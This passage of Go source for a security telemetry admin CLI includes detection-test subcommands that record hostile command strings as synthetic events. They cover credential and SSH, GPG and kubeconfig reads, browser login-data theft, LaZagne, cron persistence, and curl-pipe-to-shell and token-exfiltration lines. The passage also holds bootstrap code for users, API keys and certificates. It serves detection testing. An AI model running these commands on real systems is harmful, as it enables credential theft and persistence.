	script := fs.String("script", "", "shell script to base64-encode (stored in argv as a pipe-to-shell)")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	if strings.TrimSpace(*script) == "" {
		log.Fatal("--script is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}

	enc := base64.StdEncoding.EncodeToString([]byte(*script))
	cmd := fmt.Sprintf("echo %s | base64 -d | sh", enc)
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", cmd})
}

func cmdEmitAWSCredsRead(args []string) {
	fs := flag.NewFlagSet("emit-aws-creds-read", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "cat ~/.aws/credentials"})
}

func cmdEmitSSHKeyRead(args []string) {
	fs := flag.NewFlagSet("emit-ssh-key-read", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "cat ~/.ssh/id_rsa"})
}

func cmdEmitGPGExportSecretKeys(args []string) {
	fs := flag.NewFlagSet("emit-gpg-export-secret-keys", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "gpg --export-secret-keys --armor"})
}

func cmdEmitCronPersist(args []string) {
	fs := flag.NewFlagSet("emit-cron-persist", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}

	// High-signal demo: write a cron.d entry via tee.
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "echo '* * * * * curl http://127.0.0.1:8888/payload.sh | sh' | tee /etc/cron.d/correlic-test"})
}

func cmdEmitSystemdPersist(args []string) {
	fs := flag.NewFlagSet("emit-systemd-persist", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}

	// High-signal demo: systemctl enable a unit.
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "systemctl enable evil.service"})
}

func cmdEmitSudoChain(args []string) {
	fs := flag.NewFlagSet("emit-sudo-chain", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}

	// High-signal demo: sudo + download/exec chain.
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "sudo curl -fsSL http://127.0.0.1:8888/payload.sh | sh"})
}

func cmdEmitKubeconfigRead(args []string) {
	fs := flag.NewFlagSet("emit-kubeconfig-read", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "cat ~/.kube/config"})
}

func cmdEmitSSHAgentList(args []string) {
	fs := flag.NewFlagSet("emit-ssh-agent-list", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "ssh-add -L"})
}

func cmdEmitShellProfilePersist(args []string) {
	fs := flag.NewFlagSet("emit-shell-profile-persist", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "echo 'correlic-test' >> ~/.bashrc"})
}

func cmdEmitCurlTokenExfil(args []string) {
	fs := flag.NewFlagSet("emit-curl-token-exfil", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "curl -H 'Authorization: Bearer correlic-test' https://example.com/ingest"})
}

func cmdEmitChromeLoginData(args []string) {
	fs := flag.NewFlagSet("emit-chrome-login-data", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "cp ~/.config/google-chrome/Default/'Login Data' /tmp/chrome-login-data"})
}

func cmdEmitFirefoxLogins(args []string) {
	fs := flag.NewFlagSet("emit-firefox-logins", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "cat ~/.mozilla/firefox/abcd.default-release/logins.json"})
}

func cmdEmitBrowserCookies(args []string) {
	fs := flag.NewFlagSet("emit-browser-cookies", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "cp ~/.config/chromium/Default/Cookies /tmp/chromium-cookies"})
}

func cmdEmitLazagne(args []string) {
	fs := flag.NewFlagSet("emit-lazagne", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	cmdEmitProcessExec([]string{"--org-id", *orgIDStr, "--agent-id", *agentID, "--cmd", "python3 -m lazagne all"})
}

// cmdEmitIdentitySnapshot inserts a synthetic identity_snapshot telemetry event into telemetry_events.
//
// This provides a deterministic way to validate identity graph ingestion + drift detector end-to-end.
func cmdEmitIdentitySnapshot(args []string) {
	fs := flag.NewFlagSet("emit-identity-snapshot", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	sshFPs := fs.String("ssh-fps", "", "comma-separated ssh key fingerprints (hex)")
	gitRemotes := fs.String("git-remotes", "", "comma-separated git remote URLs (https://.. or git@host:repo)")
	kubeContexts := fs.String("kube-contexts", "", "comma-separated kube context names")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	telemetryStore := storage.NewPostgresTelemetryStore(db)

	payload := map[string]any{
		"ssh_key_fingerprints": splitCSV(*sshFPs),
		"git_remote_urls":      splitCSV(*gitRemotes),
		"kube_contexts":        splitCSV(*kubeContexts),
	}
	raw, err := json.Marshal(payload)
	if err != nil {
		log.Fatal(err)
	}
	now := time.Now().UTC()
	ev := model.TelemetryEvent{
		AgentID:   *agentID,
		EventType: "identity_snapshot",
		Timestamp: now,
		Payload:   raw,
	}
	if err := telemetryStore.InsertEvents(*orgIDStr, []model.TelemetryEvent{ev}); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("inserted=true event_type=identity_snapshot event_ts=%s\n", now.Format(time.RFC3339Nano))
}

func splitCSV(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		out = append(out, p)
	}
	return out
}

// cmdEmitGitEvent inserts a synthetic git_event telemetry event into telemetry_events.
func cmdEmitGitEvent(args []string) {
	fs := flag.NewFlagSet("emit-git-event", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	agentID := fs.String("agent-id", "", "agent id")
	op := fs.String("op", "", "git operation (clone|remote_add|remote_set_url|push|pull|fetch)")
	remoteURL := fs.String("remote-url", "", "remote URL (https://.. or git@host:repo)")
	repoPath := fs.String("repo-path", "", "local repo path on disk (optional)")
	branch := fs.String("branch", "", "branch name (optional)")
	result := fs.String("result", "ok", "result (ok|error)")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if strings.TrimSpace(*agentID) == "" {
		log.Fatal("--agent-id is required")
	}
	if strings.TrimSpace(*op) == "" {
		log.Fatal("--op is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	telemetryStore := storage.NewPostgresTelemetryStore(db)
	payload := map[string]any{
		"op":         strings.TrimSpace(*op),
		"remote_url": strings.TrimSpace(*remoteURL),
		"repo_path":  strings.TrimSpace(*repoPath),
		"branch":     strings.TrimSpace(*branch),
		"result":     strings.TrimSpace(*result),
	}
	raw, err := json.Marshal(payload)
	if err != nil {
		log.Fatal(err)
	}
	now := time.Now().UTC()
	ev := model.TelemetryEvent{
		AgentID:   *agentID,
		EventType: "git_event",
		Timestamp: now,
		Payload:   raw,
	}
	if err := telemetryStore.InsertEvents(*orgIDStr, []model.TelemetryEvent{ev}); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("inserted=true event_type=git_event event_ts=%s\n", now.Format(time.RFC3339Nano))
}

// generateRawAPIKey generates a raw API key
func generateRawAPIKey() (string, error) {
	// 32 bytes -> 64 hex chars
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// cmdCreateUser creates a user and adds them to an org
func cmdCreateUser(args []string) {
	fs := flag.NewFlagSet("create-user", flag.ExitOnError)
	orgIDStr := fs.String("org-id", "", "organization id (uuid)")
	email := fs.String("email", "", "user email")
	name := fs.String("name", "", "user name")
	role := fs.String("role", "member", "user role (admin or member)")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgIDStr) == "" {
		log.Fatal("--org-id is required")
	}
	if _, err := uuid.Parse(*orgIDStr); err != nil {
		log.Fatal("invalid --org-id")
	}
	if strings.TrimSpace(*email) == "" {
		log.Fatal("--email is required")
	}
	roleVal := strings.TrimSpace(*role)
	if roleVal != "admin" && roleVal != "member" {
		log.Fatal("--role must be 'admin' or 'member'")
	}

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	store := storage.NewPostgresUserStore(db)

	// Check if user exists
	user, err := store.GetUserByEmail(strings.TrimSpace(*email))
	if err != nil {
		log.Fatal(err)
	}

	// Create user if doesn't exist (generates random password). The account is created
	// email-verified so an installer-created admin can log in without the email flow;
	// the generated password must still be changed on first login.
	if user == nil {
		randomPassword := generateRandomPassword()
		hash, err := bcrypt.GenerateFromPassword([]byte(randomPassword), bcrypt.DefaultCost)
		if err != nil {
			log.Fatal(err)
		}
		var wasCreated bool
		user, wasCreated, err = store.CreateUserWithPassword(strings.TrimSpace(*email), strings.TrimSpace(*name), string(hash))
		if err != nil {
			log.Fatal(err)
		}
		if wasCreated {
			if _, err := db.Exec(`UPDATE users SET email_verified = true WHERE id = $1`, user.ID); err != nil {
				log.Fatal(err)
			}
			fmt.Printf("user_id=%s\n", user.ID)
			fmt.Printf("password=%s\n", randomPassword)
			fmt.Printf("email_verified=true\n")
			fmt.Printf("password_reset_required=true\n")
		} else {
			fmt.Printf("user_id=%s\n", user.ID)
			fmt.Printf("password=not_generated (user already exists)\n")
		}
	} else {
		fmt.Printf("user_id=%s\n", user.ID)
		fmt.Printf("password=not_generated (user already exists)\n")
	}

	// Add user to org
	if err := store.AddOrgUser(*orgIDStr, user.ID, roleVal); err != nil {
		log.Fatal(err)
	}

	fmt.Printf("added_to_org=true\n")
	fmt.Printf("org_id=%s\n", *orgIDStr)
	fmt.Printf("user_email=%s\n", user.Email)
	fmt.Printf("role=%s\n", roleVal)
}

// sha256Hex hashes a string using SHA-256
func sha256Hex(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

// generateRandomPassword generates a secure random password
func generateRandomPassword() string {
	b := make([]byte, 16)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)[:24] // 24 chars, URL-safe
}

// insertAPIKey creates an API key row of the given type ("service" or "agent") for a
// user in an org and returns the raw key (shown once) and the key id.
func insertAPIKey(db *sql.DB, orgID, userID, name, description, keyType string) (rawKey, keyID string, err error) {
	switch keyType {
	case "service", "agent":
	default:
		return "", "", fmt.Errorf("invalid key type %q (want service or agent)", keyType)
	}
	rawKey, err = generateRawAPIKey()
	if err != nil {
		return "", "", err
	}
	keyID = uuid.New().String()
	_, err = db.Exec(`
		INSERT INTO api_keys (id, org_id, user_id, key_hash, name, description, key_type, created_at)
		VALUES ($1, $2, $3, $4, $5, $6, $7, now())
	`, keyID, orgID, userID, sha256Hex(rawKey), name, description, keyType)
	if err != nil {
		return "", "", err
	}
	return rawKey, keyID, nil
}

// agentConfigTemplate is the agent.yaml bootstrap writes. Only keys the host agent
// accepts may appear here — it rejects unknown keys.
const agentConfigTemplate = `# Correlic agent configuration (generated by: correlic-admin bootstrap)
# Start the agent with: sudo CORRELIC_CONFIG=%[1]s go run ./cmd/agent   (from the agent/ directory)

backend_url: "https://localhost:8080"
telemetry_url: "https://localhost:8081"

# Agent API key (key_type=agent): only valid for ingest, heartbeat and agent endpoints.
api_key: "%[2]s"

# mTLS client identity (absolute paths)
tls_ca_file: "%[3]s"
tls_client_cert_file: "%[4]s"
tls_client_key_file: "%[5]s"

profile: "developer"
log_level: "info"
heartbeat_interval: 30s

ebpf_enabled: true
process_exec_enabled: true
file_monitor_enabled: true
network_monitor_enabled: true
dns_monitor_enabled: true
`

// cmdBootstrap is the one-command setup for a local-first deployment. It creates the
// org, an admin user, a dashboard (service) API key, a service account + agent API key
// for the host agent, generates and enrolls mTLS certificates into --certs-dir, and
// writes <certs-dir>/agent.yaml. Nothing is written to the current directory.
func cmdBootstrap(args []string) {
	fs := flag.NewFlagSet("bootstrap", flag.ExitOnError)
	orgName := fs.String("name", "Local", "organization name")
	email := fs.String("email", "admin@local.dev", "admin user email")
	agentEmail := fs.String("agent-email", "agent@local.dev", "service account email for the host agent")
	certsDir := fs.String("certs-dir", ".certs", "directory for generated certificates and agent.yaml")
	force := fs.Bool("force", false, "overwrite existing certs")
	_ = fs.Parse(args)

	if strings.TrimSpace(*orgName) == "" {
		log.Fatal("--name is required")
	}
	absCerts, err := filepath.Abs(*certsDir)
	if err != nil {
		log.Fatalf("resolve --certs-dir: %v", err)
	}

	fmt.Println("Correlic Bootstrap")
	fmt.Println("==================")

	db, err := openDB()
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	// 0. Apply migrations (bootstrap should be truly one-command).
	fmt.Print("Applying migrations... ")
	if err := migrate.ApplyEmbedded(db); err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")

	// 1. Create org
	fmt.Print("Creating organization... ")
	orgStore := storage.NewPostgresOrgStore(db)
	orgID := uuid.New().String()
	if err := orgStore.CreateOrg(orgID, *orgName); err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")
	fmt.Printf("org_id=%s\n", orgID)

	// 2. Create admin user (verified, no forced reset — this is the first login)
	fmt.Print("Creating admin user... ")
	userStore := storage.NewPostgresUserStore(db)
	password := generateRandomPassword()
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		log.Fatal(err)
	}
	user, created, err := userStore.CreateUserWithPassword(*email, "Admin", string(hash))
	if err != nil {
		log.Fatal(err)
	}
	if !created {
		log.Fatalf("user %s already exists; pass --email with an unused address or create-user to add it to the new org", *email)
	}
	if _, err := db.Exec(`UPDATE users SET email_verified = true, password_reset_required = false WHERE id = $1`, user.ID); err != nil {
		log.Fatal(err)
	}
	if err := userStore.AddOrgUser(orgID, user.ID, "admin"); err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")
	fmt.Printf("  user_id=%s\n", user.ID)
	fmt.Printf("  email=%s\n", *email)
	fmt.Printf("  password=%s\n", password)

	// 3. Dashboard (service) API key for the admin
	fmt.Print("Creating admin API key (service)... ")
	rawKey, _, err := insertAPIKey(db, orgID, user.ID, "admin-dashboard", "bootstrap: dashboard/CLI access", "service")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")
	fmt.Printf("api_key=%s\n", rawKey)

	// 4. Service account + agent key for the host agent
	fmt.Print("Creating agent service account + key (agent)... ")
	agentUser, err := userStore.CreateServiceAccount(*agentEmail, "Host Agent")
	if err != nil {
		log.Fatal(err)
	}
	if err := userStore.AddOrgUser(orgID, agentUser.ID, "member"); err != nil {
		log.Fatal(err)
	}
	agentKey, _, err := insertAPIKey(db, orgID, agentUser.ID, "host-agent", "bootstrap: host agent ingest key", "agent")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")
	fmt.Printf("  agent_user_id=%s\n", agentUser.ID)
	fmt.Printf("  agent_email=%s\n", *agentEmail)
	fmt.Printf("agent_api_key=%s\n", agentKey)

	// 5. Generate TLS certs
	fmt.Printf("Generating TLS certificates in %s... ", absCerts)
	if err := os.MkdirAll(absCerts, 0700); err != nil {
		log.Fatal(err)
	}
	if err := generateCerts(absCerts, *force); err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")

	// 6. Enroll client cert
	fmt.Print("Enrolling client certificate... ")
	caPath := filepath.Join(absCerts, "ca.crt")
	serverCertPath := filepath.Join(absCerts, "server.crt")
	serverKeyPath := filepath.Join(absCerts, "server.key")
	clientCertPath := filepath.Join(absCerts, "client.crt")
	clientKeyPath := filepath.Join(absCerts, "client.key")
	certData, err := os.ReadFile(clientCertPath)
	if err != nil {
		log.Fatal(err)
	}
	certs, err := parsePEMCerts(certData)
	if err != nil || len(certs) == 0 {
		log.Fatal("failed to parse client cert")
	}
	fp := sha256Hex(string(certs[0].Raw))
	clientStore := storage.NewPostgresClientCertStore(db)
	if err := clientStore.Enroll(orgID, "agent-cert", fp); err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")

	// 7. Agent config next to the certs (never in the current directory)
	agentConfigPath := filepath.Join(absCerts, "agent.yaml")
	fmt.Printf("Writing agent config %s... ", agentConfigPath)
	agentConfig := fmt.Sprintf(agentConfigTemplate, agentConfigPath, agentKey, caPath, clientCertPath, clientKeyPath)
	if err := os.WriteFile(agentConfigPath, []byte(agentConfig), 0600); err != nil {
		log.Fatal(err)
	}
	fmt.Println("ok")
	fmt.Printf("agent_config=%s\n", agentConfigPath)

	tlsEnv := fmt.Sprintf("TLS_CERT_FILE=%s TLS_KEY_FILE=%s MTLS_CA_FILE=%s", serverCertPath, serverKeyPath, caPath)
	fmt.Println("")
	fmt.Println("==================")
	fmt.Println("Bootstrap complete")
	fmt.Println("")
	fmt.Println("Next steps:")
	fmt.Println("")
	fmt.Println("1. Start the backend (from the backend/ directory, two terminals):")
	fmt.Printf("   %s LLM_ENCRYPTION_KEY=$(openssl rand -hex 32) go run ./cmd/api\n", tlsEnv)
	fmt.Printf("   %s go run ./cmd/telemetry\n", tlsEnv)
	fmt.Println("")
	fmt.Println("2. Start the host agent (needs root / CAP_BPF):")
	fmt.Printf("   cd ../agent && sudo CORRELIC_CONFIG=%s go run ./cmd/agent\n", agentConfigPath)
	fmt.Println("")
	fmt.Println("3. Log in to the dashboard with the api_key above, or with:")
	fmt.Printf("   email=%s password=%s\n", *email, password)
	fmt.Println("")
	fmt.Println("The agent_api_key is for the host agent only (already in agent.yaml); it cannot be used for the dashboard.")
}

// generateCerts creates CA, server, and client certificates
func generateCerts(dir string, force bool) error {
	caKeyPath := dir + "/ca.key"
	caCertPath := dir + "/ca.crt"
	serverKeyPath := dir + "/server.key"
	serverCertPath := dir + "/server.crt"
	clientKeyPath := dir + "/client.key"
	clientCertPath := dir + "/client.crt"
	serverCSRPath := dir + "/server.csr"
	clientCSRPath := dir + "/client.csr"
	serverExtPath := dir + "/server.ext"

	// Check if certs already exist
	if !force {
		if _, err := os.Stat(caCertPath); err == nil {
			return fmt.Errorf("certificates already exist (use --force to overwrite)")
		}
	}

	// Modern Go TLS requires SANs (CN-only certs fail verification).
	// Keep this local-dev oriented (localhost + loopback).
	serverExt := strings.Join([]string{
		"basicConstraints=CA:FALSE",
		"keyUsage=digitalSignature,keyEncipherment",
		"extendedKeyUsage=serverAuth",
		"subjectAltName=@alt_names",
		"",
		"[alt_names]",
		"DNS.1=localhost",
		"IP.1=127.0.0.1",
		"IP.2=::1",
	}, "\n")
	if err := os.WriteFile(serverExtPath, []byte(serverExt), 0600); err != nil {
		return fmt.Errorf("write server SAN extfile: %w", err)
	}

	// Generate using openssl commands (simpler than pure Go for now)
	// In production, you'd use crypto/x509 to generate programmatically
	cmds := [][]string{
		{"openssl", "req", "-x509", "-newkey", "rsa:2048", "-days", "365", "-nodes",
			"-keyout", caKeyPath, "-out", caCertPath, "-subj", "/CN=correlic-dev-ca"},
		{"openssl", "req", "-newkey", "rsa:2048", "-nodes",
			"-keyout", serverKeyPath, "-out", serverCSRPath, "-subj", "/CN=localhost"},
		{"openssl", "x509", "-req", "-in", serverCSRPath, "-CA", caCertPath, "-CAkey", caKeyPath,
			"-CAcreateserial", "-out", serverCertPath, "-days", "365", "-extfile", serverExtPath},
		{"openssl", "req", "-newkey", "rsa:2048", "-nodes",
			"-keyout", clientKeyPath, "-out", clientCSRPath, "-subj", "/CN=correlic-agent"},
		{"openssl", "x509", "-req", "-in", clientCSRPath, "-CA", caCertPath, "-CAkey", caKeyPath,
			"-CAcreateserial", "-out", clientCertPath, "-days", "365"},
	}

	for _, cmd := range cmds {
		if err := runCmd(cmd[0], cmd[1:]...); err != nil {
			return fmt.Errorf("failed to run %s: %w", cmd[0], err)
		}
	}

	// Clean up CSR files
	_ = os.Remove(serverCSRPath)
	_ = os.Remove(clientCSRPath)
	_ = os.Remove(dir + "/ca.srl")
	_ = os.Remove(serverExtPath)

	return nil
}

// runCmd executes a command, discarding stdout but keeping stderr so a failing or
// missing tool (e.g. openssl not installed) is reported with its actual message.
func runCmd(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	var stderr bytes.Buffer
	cmd.Stdout = nil
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		if errors.Is(err, exec.ErrNotFound) {
			return fmt.Errorf("%s is not installed or not on PATH (install it and retry)", name)
		}
		if msg := strings.TrimSpace(stderr.String()); msg != "" {
			return fmt.Errorf("%s %s: %w: %s", name, strings.Join(args, " "), err, msg)
		}
		return fmt.Errorf("%s %s: %w", name, strings.Join(args, " "), err)
	}
	return nil
}
